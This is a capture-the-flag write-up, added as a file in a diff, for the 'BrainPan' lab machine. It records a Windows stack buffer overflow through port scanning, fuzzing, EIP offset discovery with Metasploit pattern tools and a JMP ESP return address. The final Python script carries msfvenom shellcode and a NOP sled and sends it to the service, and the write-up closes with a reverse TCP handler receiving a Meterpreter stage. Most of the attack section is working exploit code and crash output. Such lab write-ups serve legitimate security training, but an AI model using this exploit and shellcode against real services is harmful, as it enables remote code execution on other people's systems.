@@ -1,0 +1,503 @@
+BrainPan
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.181.32
+Host is up, received echo-reply ttl 63 (0.16s latency).
+Scanned at 2021-06-02 09:26:41 EDT for 61s
+
+PORT      STATE SERVICE   REASON         VERSION
+9999/tcp  open  abyss?    syn-ack ttl 63
+| fingerprint-strings: 
+|   NULL: 
+|     _| _| 
+|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
+|     _|_| _| _| _| _| _| _| _| _| _| _| _|
+|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
+|     [________________________ WELCOME TO BRAINPAN _________________________]
+|_    ENTER THE PASSWORD
+10000/tcp open  websocket syn-ack ttl 63 websockify (SimpleHTTP 0.6; Python 2.7.3)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V=7.91%I=7%D=6/2%Time=60B78718%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
+SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
+SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
+SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
+SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
+SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
+SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
+SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
+SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
+SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\
+SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2
+SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2
+SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2
+SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Android 4.1.1 (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Linux 2.6.32 (92%), Linux 3.0 - 3.2 (92%), Linux 3.0 - 3.5 (92%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.91%E=4%D=6/2%OT=9999%CT=%CU=42075%PV=Y%DS=2%DC=T%G=N%TM=60B7874E%P=x86_64-pc-linux-gnu)
+SEQ(SP=107%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=8)
+OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
+WIN(W1=45EA%W2=45EA%W3=45EA%W4=45EA%W5=45EA%W6=45EA)
+ECN(R=Y%DF=Y%T=40%W=4602%O=M505NNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 0.005 days (since Wed Jun  2 09:21:08 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=264 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE (using port 9999/tcp)
+HOP RTT       ADDRESS
+1   163.76 ms 10.8.0.1
+2   163.89 ms 10.10.181.32
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 09:27
+Completed NSE at 09:27, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 09:27
+Completed NSE at 09:27, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 09:27
+Completed NSE at 09:27, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 68.14 seconds
+           Raw packets sent: 62 (4.340KB) | Rcvd: 43 (3.176KB)
+
+Checking the port:
+---------------------
+
+# nc 10.10.181.32 9999
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD                              
+
+                           AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+ IT CRASHES!!
+
+ BUT WE DON'T HAVE THE EXECUTABLE, LETS ENUMERATE THE WEBPAGE AT PORT 10000 USING GOBUSTER:
+ ----------------------------------------------------------------------------------------------
+
+ # gobuster dir -u http://10.10.181.32:10000 -w /usr/share/wordlists/dirb/common.txt -t 20
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.181.32:10000
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/06/02 09:36:17 Starting gobuster in directory enumeration mode
+===============================================================
+/bin                  (Status: 301) [Size: 0] [--> /bin/]
+/index.html           (Status: 200) [Size: 215] 
+
+CHECK THE BIN FOLDER WE GET THE EXECUTABLE!!
+DOWNLOAD IT AND RUN IT WITH "WINE"
+
+
+# wine brainpan.exe 
+[+] initializing winsock...done.
+[+] server socket created.
+[+] bind done on port 9999
+[+] waiting for connections.
+[+] received connection.
+[get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV
+]
+[get_reply] copied 834 bytes to buffer
+wine: Unhandled page fault on read access to 41414141 at address 41414141 (thread 0009), starting debugger...
+Unhandled exception: page fault on read access to 0x41414141 in 32-bit code (0x41414141).
+Register dump:
+ CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
+ EIP:41414141 ESP:0042f870 EBP:41414141 EFLAGS:00010297(  R- --  I S -A-P-C)
+ EAX:ffffffff EBX:3ffff000 ECX:0042f660 EDX:ffffffff
+ ESI:00000000 EDI:00000000
+Stack dump:
+0x0042f870:  41414141 41414141 41414141 41414141
+0x0042f880:  41414141 41414141 41414141 41414141
+0x0042f890:  41414141 41414141 41414141 41414141
+0x0042f8a0:  41414141 41414141 41414141 41414141
+0x0042f8b0:  41414141 41414141 41414141 41414141
+0x0042f8c0:  41414141 41414141 41414141 41414141
+Backtrace:
+=>0 0x41414141 (0x41414141)
+0x41414141: -- no code accessible --
+Modules:
+
+WE CAN SEE THAT AFTER GIVING A LARGE AMOUNT OF INPUT IT CRASHES(SEE THE STACK FULL OF 41s)
+
+LETS CHECK THE OFFSET FIRST USING "PATTERN_CREATE.RB" WHICH IS IN THE METASPLOIT MODULES
+----------------------------------------------------------------------------------------------
+
+CREATING THE BUFFER:
+----------------------
+
+# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
+
+SENDING THE BUFFER:
+---------------------
+
+# nc localhost 9999
+_|                            _|                                        
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|                          
+                                            _|
+
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD                              
+
+                          >> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
+
+
+CHECKING THE OFFSET:
+------------------------
+
+
+# wine brainpan.exe 
+[+] initializing winsock...done.
+[+] server socket created.
+[+] bind done on port 9999
+[+] waiting for connections.
+[+] received connection.
+[get_reply] s = [Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
+]
+[get_reply] copied 601 bytes to buffer
+wine: Unhandled page fault on read access to 35724134 at address 35724134 (thread 0009), starting debugger...
+Unhandled exception: page fault on read access to 0x35724134 in 32-bit code (0x35724134).
+Register dump:
+ CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
+ EIP:35724134 ESP:0042f870 EBP:72413372 EFLAGS:00010297(  R- --  I S -A-P-C)
+ EAX:ffffffff EBX:3ffff000 ECX:0042f660 EDX:ffffffff
+ ESI:00000000 EDI:00000000
+Stack dump:
+0x0042f870:  41367241 72413772 39724138 41307341
+0x0042f880:  73413173 33734132 41347341 73413573
+0x0042f890:  37734136 41387341 74413973 31744130
+0x0042f8a0:  41327441 74413374 35744134 41367441
+0x0042f8b0:  74413774 39744138 0000000a 00000000
+0x0042f8c0:  0f270002 00000000 ffffffff 00000000
+Backtrace:
+=>0 0x35724134 (0x72413372)            ################# CRASHES AT HERE WHICH IS THE EIP ####################
+0x35724134: -- no code accessible --
+Modules:
+Module	Address			Debug info	Name (6 modules)
+PE	31170000-31176000	Deferred        brainpan
+PE	7b020000-7b023000	Deferred        kernelbase
+PE	7b420000-7b5db000	Deferred        kernel32
+PE	7bc30000-7bc34000	Deferred        ntdll
+PE	7f930000-7f934000	Deferred        ws2_32
+PE	7f980000-7f984000	Deferred        msvcrt
+Threads:
+process  tid      prio (all id:s are in hex)
+00000008 (D) Z:\root\buffer_overflows\windows\brainpan\brainpan.exe
+	00000009    0 <==
+	0000002d    0
+0000000e services.exe
+
+--[snip]--
+
+    Wine build: wine-5.0.3 (Debian 5.0.3-3)
+    Platform: i386 (WOW64)
+    Version: Windows 7
+    Host system: Linux
+    Host version: 5.10.0-kali7-amd64
+
+USING THE "PATTERN_OFFSET.RB" TO CHECK THE OFFSET:
+-------------------------------------------------------
+
+# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 600 -q 35724134
+[*] Exact match at offset 524
+
+##################
+#   OFFSET=524   #
+##################
+
+
+LETS CREATE OUR EXPLOIT:
+-------------------------
+
+#!/usr/bin/python3
+
+import socket
+import sys
+
+ip = "127.0.0.1"
+port = 9999
+
+buffer = b"A"*524 + b"B"*4 # WHICH WILL OVERWRITE THE EIP 
+
+try:
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((ip, port))
+	s.send(buffer + b"\r\n")
+
+except:
+	print("Error, Socket Connection Failed!")
+	sys.exit()
+
+s.close()
+
+
+CHECKING THE CRASH:
+---------------------
+
+Unhandled exception: page fault on read access to 0x42424242 in 32-bit code (0x42424242).
+Register dump:
+ CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
+ EIP:42424242 ESP:0042f870 EBP:41414141 EFLAGS:00010297(  R- --  I S -A-P-C)
+ EAX:ffffffff EBX:3ffff000 ECX:0042f660 EDX:ffffffff
+ ESI:00000000 EDI:00000000
+Stack dump:
+0x0042f870:  00000a0d 0042fa90 000003e8 00000000
+0x0042f880:  00000000 00000000 00000000 0042f920
+0x0042f890:  00000000 00000000 00000000 00000010
+0x0042f8a0:  7bcd1f50 00000000 00000000 0042f908
+0x0042f8b0:  d8c20002 0100007f 00000000 00000000
+0x0042f8c0:  0f270002 00000000 ffffffff 00000000
+Backtrace:
+=>0 0x42424242 (0x41414141)                   ################### OUR B's JUST OVERWRITE THE EIP POINTER ##################
+0x42424242: -- no code accessible --
+Modules:
+Module	Address			Debug info	Name (6 modules)
+PE	31170000-31176000	Deferred        brainpan
+PE	7b020000-7b023000	Deferred        kernelbase
+PE	7b420000-7b5db000	Deferred        kernel32
+PE	7bc30000-7bc34000	Deferred        ntdll
+PE	7f930000-7f934000	Deferred        ws2_32
+PE	7f980000-7f984000	Deferred        msvcrt
+Threads:
+process  tid      prio (all id:s are in hex)
+00000008 (D) Z:\root\buffer_overflows\windows\brainpan\brainpan.exe
+	00000009    0 <==
+
+--[snip]--
+
+    Wine build: wine-5.0.3 (Debian 5.0.3-3)
+    Platform: i386 (WOW64)
+    Version: Windows 7
+    Host system: Linux
+    Host version: 5.10.0-kali7-amd64
+
+
+
+###################################
+LETS USE THE "IMMUNITY DEBBUGER" TO GET THE STACK POINTER(JMP ESP) SO THAT WE CAN OVEWRWRITE OUR EIP WITH THE STACK POINTER
+SO WHEN IT HITS THE EIP WHICH IS POINTING TO THE STACK POINTER(ACTUALLY THE STACK ITSELF) IT WILL EXECUTE OUR SHELLCODE ; WHICH WE PLACE IT THERE IN A MINUTE WITH OUR NOP SLED(NOPS + SHELLCODE)
+
+
+SO AUR PAYLOAD WILL BECOME:
+----------------------------
+
+PAYLOAD = JUNK*520 + "A"*4(OVERWRITING ESP) + <JMP ESP> + NOPS + SHELLCODE 
+
+OUR FINAL PAYLOAD:
+------------------------
+
+#!/usr/bin/python3
+
+import socket
+import sys
+
+ip = "127.0.0.1"
+port = 9999
+
+'''
+badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+'''
+
+buf =  b""
+buf += b"\xdb\xd0\xb8\x19\x8f\x56\x27\xd9\x74\x24\xf4\x5b\x33"
+buf += b"\xc9\xb1\x59\x31\x43\x19\x83\xeb\xfc\x03\x43\x15\xfb"
+buf += b"\x7a\xaa\xcf\x74\x84\x53\x10\xea\x0c\xb6\x21\x38\x6a"
+buf += b"\xb2\x10\x8c\xf8\x96\x98\x67\xac\x02\x2a\x05\x79\x1a"
+buf += b"\xd3\xe6\xce\x16\x0d\xc9\xf0\x0b\x6d\x48\x8d\x51\xa2"
+buf += b"\xaa\xac\x99\xb7\xab\xe9\x6f\xbd\x44\xa7\x38\xb6\xc8"
+buf += b"\x58\x4c\x8a\xd0\x59\x82\x80\x68\x22\xa7\x57\x1c\x9e"
+buf += b"\xa6\x87\x57\x46\x89\x26\xb4\xfc\x81\x30\x6a\x86\xdb"
+buf += b"\x35\xb6\xb9\x24\xfc\x4d\x8d\x51\xfe\x87\xdf\xa5\xad"
+buf += b"\xe6\xef\x2b\xaf\x2f\xd7\xd3\xda\x5b\x2b\x69\xdd\x98"
+buf += b"\x51\xb5\x68\x3e\xf1\x3e\xca\x9a\x03\x92\x8d\x69\x0f"
+buf += b"\x5f\xd9\x35\x0c\x5e\x0e\x4e\x28\xeb\xb1\x80\xb8\xaf"
+buf += b"\x95\x04\xe0\x74\xb7\x1d\x4c\xda\xc8\x7d\x28\x83\x6c"
+buf += b"\xf6\xdb\xd2\x11\xf7\x23\xdb\x4f\x6f\xef\x16\x70\x6f"
+buf += b"\x67\x20\x03\x5d\x28\x9a\x8b\xed\xa1\x04\x4b\x64\xa5"
+buf += b"\xb6\x83\xce\xa6\x48\x24\x2e\xee\x8e\x70\x7e\x98\x27"
+buf += b"\xf9\x15\x58\xc7\x2c\x83\x52\x5f\xb0\x53\x63\x9e\x26"
+buf += b"\x51\x63\xa4\x64\xdc\x85\xf4\xd8\x8e\x19\xb5\x88\x6e"
+buf += b"\xca\x5d\xc3\x61\x35\x7d\xec\xa8\x5e\x14\x03\x04\x36"
+buf += b"\x81\xba\x0d\xcc\x30\x42\x98\xa8\x73\xc8\x28\x4c\x3d"
+buf += b"\x39\x59\x5e\x2a\x5e\xa1\x9e\xab\xcb\xa1\xf4\xaf\x5d"
+buf += b"\xf6\x60\xb2\xb8\x30\x2f\x4d\xef\x43\x28\xb1\x6e\x75"
+buf += b"\x42\x84\xe4\x39\x3c\xe9\xe8\xb9\xbc\xbf\x62\xb9\xd4"
+buf += b"\x67\xd7\xea\xc1\x67\xc2\x9f\x59\xf2\xed\xc9\x0e\x55"
+buf += b"\x86\xf7\x69\x91\x09\x08\x5c\xa1\x4e\xf6\x22\x8e\xf6"
+buf += b"\x9e\xdc\x8e\x06\x5e\xb7\x0e\x57\x36\x4c\x20\x58\xf6"
+buf += b"\xad\xeb\x31\x9e\x24\x7a\xf3\x3f\x38\x57\x55\xe1\x39"
+buf += b"\x54\x4e\x12\x43\x15\x71\xd3\xb4\x3f\x16\xd4\xb4\x3f"
+buf += b"\x28\xe9\x62\x06\x5e\x2c\xb7\x3d\x51\x1b\x9a\x14\xf8"
+buf += b"\x63\x88\x67\x29"
+
+
+buffer = b"A"*524 
+nops = b"\x90"*32
+
+payload = buffer + b"\xf3\x12\x17\x31" + nops + buf
+
+#311712F3
+try:
+	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((ip, port))
+	s.send(payload  + b"\r\n")
+
+except:
+	print("Error, Socket Connection Failed!")
+	sys.exit()
+
+s.close()
+
+
+
+PAYLOAD = msfvenon
+JMP ESP = immunity debugger (mona.py)
+
+GOT A SHELL!!
+-------------------
+[*] Started reverse TCP handler on 127.0.0.1:1234 
+[*] Sending stage (175174 bytes) to 127.0.0.1
